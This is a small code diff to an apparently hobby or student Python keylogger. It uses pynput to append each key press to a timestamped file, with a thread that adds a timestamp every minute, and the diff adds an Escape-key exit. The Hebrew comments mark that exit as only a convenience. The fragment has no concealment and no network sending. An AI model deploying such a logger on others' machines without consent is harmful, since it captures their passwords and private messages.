@@ -1,5 +1,5 @@
 import threading
-from pynput.keyboard import Listener
+from pynput.keyboard import Listener, Key
 from datetime import datetime
 import time
 now = datetime.now().strftime("%d-%m-%Y-%H.%M.%S")
@@ -18,6 +18,8 @@ def on_press(key):
     with open(filename, "a", encoding="utf-8") as file:
         file.write(f'{text_key}\n')
         file.flush()
+    if key == Key.esc:#רק לשימוש נוח, לא רלוונטי לפרוייקט
+     return  False#רק לשימוש נוח, לא רלוונטי לפרוייקט
 Thread_timestemp_everyminute = threading.Thread(target=timestemp_everyminute, daemon=True)
 Thread_timestemp_everyminute.start()
 with Listener(on_press=on_press) as listener:
